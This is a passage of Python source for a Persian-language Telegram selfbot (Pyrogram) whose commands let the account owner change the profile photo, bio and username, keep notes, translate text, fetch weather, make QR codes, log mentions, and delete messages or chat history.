            media_url = thumbnail_url
            if not media_url: return await loading_msg.edit("❌ **لینک عکس یافت نشد**")
            await loading_msg.edit("🖼️ **در حال دانلود عکس...**")
            try:
                image_response = requests.get(media_url, timeout=30)
                if image_response.status_code != 200: return await loading_msg.edit("❌ **خطا در دانلود عکس**")
                temp_file = f"temp_insta_{post_id}.jpg"
                with open(temp_file, 'wb') as f: f.write(image_response.content)
                await loading_msg.edit("📤 **در حال آپلود عکس...**")
                try: await client.send_photo(chat_id=message.chat.id, photo=temp_file, caption=caption_text, reply_to_message_id=message.id)
                except: pass
                if os.path.exists(temp_file): os.remove(temp_file)
                await loading_msg.delete()
            except: pass
    except: pass

@app.on_message(filters.me & filters.command("پینگ", prefixes=""))
async def ping_command(client: Client, message: Message):
    start_time = datetime.now()
    ping_msg = await message.edit("**⏳ در حال بررسی...**")
    end_time = datetime.now()
    ping_time = (end_time - start_time).microseconds / 1000
    await ping_msg.edit(f"**🏓 پونگ!**\n**⏱ سرعت: {ping_time:.2f} ms**")

# ==============================
# قابلیت‌های جدید اضافه شده
# ==============================

@app.on_message(filters.me & filters.command("پروفایل", prefixes="") & filters.regex(r"^پروفایل$"))
async def set_pfp(client, message):
    if not message.reply_to_message or not message.reply_to_message.photo:
        return await message.edit("❌ **لطفا روی یک عکس ریپلای کنید**")
    loading_msg = await message.edit("🖼 **در حال تغییر عکس پروفایل...**")
    try:
        file_path = await message.reply_to_message.download()
        await client.set_profile_photo(photo=file_path)
        os.remove(file_path)
        await loading_msg.edit("✅ **عکس پروفایل با موفقیت تغییر کرد**")
    except Exception as e:
        await loading_msg.edit(f"❌ **خطا:** `{str(e)}`")

@app.on_message(filters.me & filters.command("بایو", prefixes=""))
async def set_bio(client, message):
    if len(message.command) < 2:
        return await message.edit("❌ **استفاده:** `بایو متن جدید`")
    bio = ' '.join(message.command[1:])
    try:
        await client.update_profile(bio=bio)
        await message.edit(f"✅ **بیوگرافی تغییر کرد:**\n{bio}")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{e}`")

@app.on_message(filters.me & filters.command("یوزر", prefixes=""))
async def set_username(client, message):
    if len(message.command) < 2:
        return await message.edit("❌ **استفاده:** `یوزر username`")
    uname = message.command[1].lstrip('@')
    try:
        await client.set_username(uname)
        await message.edit(f"✅ **نام کاربری تغییر کرد:** @{uname}")
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{e}`")

@app.on_message(filters.me & filters.command("یادداشت", prefixes=""))
async def add_note(client, message):
    if len(message.command) < 2: return await message.edit("❌ **استفاده:** `یادداشت متن`")
    notes = load_notes()
    note_id = str(len(notes) + 1)
    notes[note_id] = ' '.join(message.command[1:])
    save_notes(notes)
    await message.edit(f"✅ **یادداشت شماره {note_id} ذخیره شد**")

@app.on_message(filters.me & filters.command("یادداشت‌ها", prefixes=""))
async def list_notes(client, message):
    notes = load_notes()
    if not notes: return await message.edit("❌ **هیچ یادداشتی ثبت نشده**")
    text = "📝 **لیست یادداشت‌ها**\n\n"
    for nid, txt in notes.items(): text += f"**{nid}.** {txt[:50]}...\n"
    await message.edit(text)

@app.on_message(filters.me & filters.command("حذف یادداشت", prefixes=""))
async def del_note(client, message):
    if len(message.command) < 2: return await message.edit("❌ **استفاده:** `حذف یادداشت آیدی`")
    notes = load_notes()
    nid = message.command[1]
    if nid in notes:
        del notes[nid]; save_notes(notes)
        await message.edit(f"✅ **یادداشت {nid} حذف شد**")
    else: await message.edit("❌ **یادداشت یافت نشد**")

@app.on_message(filters.me & filters.command("ترجمه", prefixes=""))
async def translate_text(client, message):
    text_to_translate = ""
    if message.reply_to_message and (message.reply_to_message.text or message.reply_to_message.caption):
        text_to_translate = message.reply_to_message.text or message.reply_to_message.caption
    elif len(message.command) > 1:
        text_to_translate = ' '.join(message.command[1:])
    if not text_to_translate: return await message.edit("❌ **متنی برای ترجمه یافت نشد**")
    loading_msg = await message.edit("🔄 **در حال ترجمه...**")
    try:
        url = f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=fa&dt=t&q={urllib.parse.quote(text_to_translate)}"
        resp = requests.get(url).json()
        translated = "".join([s[0] for s in resp[0]])
        await loading_msg.edit(f"🌐 **ترجمه:**\n\n{translated}")
    except Exception as e:
        await loading_msg.edit(f"❌ **خطا در ترجمه:** `{e}`")

@app.on_message(filters.me & filters.command("آب و هوا", prefixes=""))
async def weather_cmd(client, message):
    if len(message.command) < 2: return await message.edit("❌ **استفاده:** `آب و هوا تهران`")
    city = ' '.join(message.command[1:])
    loading_msg = await message.edit(f"🌤 **در حال دریافت آب و هوای {city}...**")
    try:
        resp = requests.get(f"https://wttr.in/{city}?format=%l:+%c+%t+%h+%w").text
        await loading_msg.edit(f"🌤 **آب و هوا**\n\n📍 {resp}")
    except Exception as e:
        await loading_msg.edit(f"❌ **خطا:** `{e}`")

@app.on_message(filters.me & filters.command("بارکد", prefixes=""))
async def qr_code(client, message):
    if len(message.command) < 2: return await message.edit("❌ **استفاده:** `بارکد متن`")
    text = ' '.join(message.command[1:])
    loading_msg = await message.edit("🎨 **در حال ساخت بارکد...**")
    try:
        url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(text)}"
        resp = requests.get(url)
        if resp.status_code == 200:
            with open("qr.png", "wb") as f: f.write(resp.content)
            await client.send_photo(message.chat.id, "qr.png", caption=f"✅ **بارکد شما:**\n`{text}`")
            os.remove("qr.png")
            await loading_msg.delete()
        else: await loading_msg.edit("❌ **خطا در ساخت بارکد**")
    except Exception as e:
        await loading_msg.edit(f"❌ **خطا:** `{e}`")

@app.on_message(filters.me & filters.command("شنود", prefixes="") & filters.regex(r"^شنود (روشن|خاموش)$"))
async def tag_logger(client, message):
    global tag_logger_on
    action = message.matches[0].group(1)
    if action == "روشن":
        tag_logger_on = True
        await message.edit("✅ **سیستم شنود روشن شد**\nشما از تگ شدن در گروه‌ها مطلع خواهید شد.")
    else:
        tag_logger_on = False
        await message.edit("❌ **سیستم شنود خاموش شد**")

@app.on_message(filters.me & filters.command("حذف زمان‌دار", prefixes=""))
async def auto_delete_msg(client, message):
    if not message.reply_to_message or len(message.command) < 2:
        return await message.edit("❌ **روی پیام ریپلای کنید و تایم بدهید**\nمثال: `حذف زمان‌دار 10`")
    try:
        seconds = int(message.command[1])
        await message.delete()
        msg_to_del = message.reply_to_message
        await asyncio.sleep(seconds)
        await msg_to_del.delete()
    except: pass

@app.on_message(filters.me & filters.command("پاکسازی", prefixes=""))
async def clear_chat_history(client, message):
    await message.edit("🗑 **در حال پاک کردن تاریخچه چت...**")
    try:
        async for msg in client.get_chat_history(message.chat.id):
            try:
                await msg.delete()
                await asyncio.sleep(0.2)
            except: pass
    except Exception as e:
        await message.edit(f"❌ **خطا:** `{e}`")

@app.on_message(filters.me & filters.command(["پنل", "panel"], prefixes=""))
async def panel_command(client, message: Message):
    loading_msg = await message.edit_text("⏳ **در حال ارتباط با ربات هلپر...**")
    try:
        results = await client.get_inline_bot_results(bot_username, "panel")
        if results and results.results:
            await client.send_inline_bot_result(
                chat_id=message.chat.id,
                query_id=results.query_id,
                result_id=results.results[0].id
            )
            await loading_msg.delete()
        else:
            await loading_msg.edit_text("❌ **پنل یافت نشد**\nربات هلپر روشن است اما پاسخی برای پنل ارسال نکرد.")
    except Exception as e:
        error_msg = str(e)
        if "BOT_RESPONSE_TIMEOUT" in error_msg or "Timeout" in error_msg:
            await loading_msg.edit_text(
                "❌ **ربات هلپر در زمان مقرر پاسخ نداد! (Timeout)**\n\n"
                "🔧 **دلایل احتمالی و راه‌حل:**\n"
                "1️⃣ ربات هلپر (`helper.py`) در حال اجرا نیست یا در لاگ‌ها ارور داده و خاموش شده است. (لاگ سرور را چک کنید)\n"
                "2️⃣ سرور شما کند است و ربات هلپر نمی‌تواند سریع پاسخ دهد.\n"
                "3️⃣ در BotFather دستور `/setinline` را بزنید و مطمئن شوید یک پیام راهنما (مثلاً `Panel`) ثبت کرده‌اید."
            )
        else:
            await loading_msg.edit_text(f"❌ **خطا در باز کردن پنل:**\n`{error_msg}`")

@app.on_message(filters.me & filters.regex(r'^حذف ریکت$'))
async def remove_reaction_command(client, message):
    if message.reply_to_message and message.reply_to_message.from_user:
        user_id = message.reply_to_message.from_user.id
        if str(user_id) in auto_reactions:
            del auto_reactions[str(user_id)]; save_reactions()
            await message.edit(f"✅ **ریکشن حذف شد**")
        else: await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
    else: await message.edit("❌ **لطفاً روی پیام کاربر ریپلای کنید**")

if __name__ == "__main__":
    if USER_ID: print(f"✅ سلف‌بات برای کاربر {USER_ID} در حال اجرا...")
    else: print("⚠️ سلف‌بات در حالت معمولی اجرا شد")
    app.run()
